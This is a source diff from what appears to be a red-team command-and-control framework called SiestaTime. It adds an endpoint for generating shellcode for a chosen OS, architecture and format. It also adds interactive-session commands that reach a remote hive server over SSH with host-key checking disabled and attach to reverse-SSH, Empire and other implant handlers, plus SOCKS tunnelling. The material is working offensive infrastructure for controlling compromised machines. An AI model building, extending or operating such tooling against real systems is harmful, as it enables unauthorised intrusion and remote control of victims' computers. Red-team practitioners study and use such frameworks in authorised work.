@@ -42,6 +42,12 @@ type ImplantObject struct {
     Arch string   `json:"arch"`
 }
 
+type ShellcodeObject struct {
+    Name string   `json:"name"`
+    OsName string   `json:"osname"`
+    Arch string   `json:"arch"`
+    Format string `json:"format"`
+}
 
 
 /*
@@ -190,6 +196,7 @@ func guiHandler() {
     router.HandleFunc("/interact", Interact).Methods("POST")
     router.HandleFunc("/report", DownloadReport).Methods("POST")
     router.HandleFunc("/implant", DownloadImplant).Methods("POST")
+    router.HandleFunc("/shellcode", DownloadShellcode).Methods("POST")
     router.HandleFunc("/redirector", DownloadRedirector).Methods("POST")
 
     //Initialize the server with previous router
@@ -552,10 +559,15 @@ func Interact(w http.ResponseWriter, r *http.Request) {
         command = "gnome-terminal -- ssh -oStrictHostKeyChecking=no -p "+sshPort+" -i ./vpskeys/"+stagingName+".pem ubuntu@"+hiveD+" 'sudo printf \"\n\nInteractive Session started "+timeLog+",from:"+username+"\n\n\" >> "+interact.Handler+".log;sudo reptyr -s $(pgrep ruby)|tee -a "+interact.Handler+".log'" 
     case "empire":
         command = "gnome-terminal -- ssh -oStrictHostKeyChecking=no -p "+sshPort+" -i ./vpskeys/"+stagingName+".pem ubuntu@"+hiveD+" 'sudo printf \"\n\nInteractive Session started "+timeLog+",from:"+username+"\n\n\" >> "+interact.Handler+".log;sudo reptyr -s $(pgrep python)|tee -a "+interact.Handler+".log'" 
-    case "ssh":
-        command = "gnome-terminal -- ssh -oStrictHostKeyChecking=no -t -p "+sshPort+" -i ./vpskeys/"+stagingName+".pem ubuntu@"+hiveD+" 'sudo printf \"\n\nInteractive Session started "+timeLog+",from:"+username+"\n\n\" >> "+interact.Handler+".log;./tools revsshclient 2222|tee -a "+interact.Handler+".log'"
+    
+    case "sshLinOsx":
+        command = "gnome-terminal -- ssh -oStrictHostKeyChecking=no -t -p "+sshPort+" -i ./vpskeys/"+stagingName+".pem ubuntu@"+hiveD+" 'sudo printf \"\n\nInteractive Session started "+timeLog+",from:"+username+"\n\n\" >> "+interact.Handler+".log;./tools revsshclientLinDar 2222|tee -a "+interact.Handler+".log'"
+    case "sshCmd":
+        command = "gnome-terminal -- ssh -oStrictHostKeyChecking=no -t -p "+sshPort+" -i ./vpskeys/"+stagingName+".pem ubuntu@"+hiveD+" 'sudo printf \"\n\nInteractive Session started "+timeLog+",from:"+username+"\n\n\" >> "+interact.Handler+".log;./tools revsshclientClassicCMD 2222|tee -a "+interact.Handler+".log'"    
+    
     case "socks5":
         command = "gnome-terminal -- ssh -oStrictHostKeyChecking=no -t -p "+sshPort+" -i ./vpskeys/"+stagingName+".pem -L 127.0.0.1:"+interact.Socks5Port+":127.0.0.1:2222 ubuntu@"+hiveD+" -N"
+    
     case "killssh":
         command = "ssh -oStrictHostKeyChecking=no -t -p "+sshPort+" -i ./vpskeys/"+stagingName+".pem ubuntu@"+hiveD+" 'sudo pkill -u anonymous'"
     }    
@@ -656,6 +668,48 @@ func DownloadImplant(w http.ResponseWriter, r *http.Request) {
        fmt.Println("Error Downloading Implant"+ error) 
     }
 }
+
+
+//Download a Shellcodes
+func DownloadShellcode(w http.ResponseWriter, r *http.Request) {
+
+    var(
+        shellcode ShellcodeObject
+    )
+
+    //Some basic CSRF protection with custom headers, will Implement csrf tokens soon
+    ua := r.Header.Get("User-Agent")
+    if !strings.Contains(ua,"SiestaTime") {
+        fmt.Println("There it was an attempt to perform a POST with a different User Agent: "+ua)
+        return
+    }
+
+    ct := r.Header.Get("Content-Type")
+    if !strings.Contains(ct,"application/json") {
+        fmt.Println("There it was an attempt to perform a POST with a different Content-Type: "+ct)
+        return
+    }
+ 
+    buf := new(bytes.Buffer)
+    buf.ReadFrom(r.Body)
+    
+    //Decode Json Job, add Jid, time and status
+    errDaws := json.Unmarshal([]byte(buf.String()),&shellcode)
+    if errDaws != nil {
+        fmt.Println("Error Decoding Json"+ errDaws.Error())
+    }
+
+    if !namesInputWhite(shellcode.Name){
+        fmt.Println("Dangerous Input For Download Implant: "+shellcode.Name)
+        return
+    }
+
+    error := getShellcode(shellcode.Name,shellcode.OsName,shellcode.Arch,shellcode.Format)
+    if error != "" {
+       fmt.Println("Error Downloading Implant"+ error) 
+    }
+}
+
 
 //Download a Redirector from Hive
 func DownloadRedirector(w http.ResponseWriter, r *http.Request) {
